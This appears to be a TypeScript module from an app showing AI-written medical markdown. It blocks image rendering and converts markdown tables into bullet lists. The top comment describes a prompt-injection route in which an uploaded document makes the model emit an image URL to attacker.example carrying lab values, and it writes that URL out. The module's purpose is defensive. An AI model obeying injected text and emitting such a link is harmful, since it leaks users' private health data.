// Elements never rendered from AI-written markdown (chat answers, document
// summaries). An <img> loads its URL the moment it is shown, so a prompt
// injected through an uploaded document could make the model emit
// ![](https://attacker.example/?d=<lab values>) and leak data with no
// click. Links stay: they need a click and show their target.
export const NO_REMOTE_IMAGES = ['img'];

// react-markdown runs without remark-gfm, so it has no tables: an answer
// with a markdown table ("| Date | Ferritin |" ...) showed as a run of
// pipes. Each table becomes a bullet list, one bullet per row, labelled
// with the header: "- Date: 2 June 2026 · Ferritin: 42 ng/mL".
const ROW = /^\s*\|.*\|\s*$/;
const SEP = /^\s*\|?\s*:?-+:?\s*(\|\s*:?-+:?\s*)*\|?\s*$/;
const cells = (line: string) => line.trim().replace(/^\||\|$/g, '').split('|').map(c => c.trim());

export function tablesToLists(md: string): string {
  const lines = md.split('\n');
  const out: string[] = [];
  for (let i = 0; i < lines.length; i++) {
    if (!(ROW.test(lines[i]) && i + 1 < lines.length && SEP.test(lines[i + 1]) && lines[i + 1].includes('-'))) {
      out.push(lines[i]);
      continue;
    }
    const head = cells(lines[i]);
    if (out.length && out[out.length - 1].trim() !== '') out.push('');
    let j = i + 2;
    for (; j < lines.length && ROW.test(lines[j]); j++) {
      const parts = cells(lines[j])
        .map((c, k) => (!c ? '' : head[k] ? `${head[k]}: ${c}` : c))
        .filter(Boolean);
      if (parts.length) out.push(`- ${parts.join(' · ')}`);
    }
    out.push('');
    i = j - 1;
  }
  return out.join('\n');
}
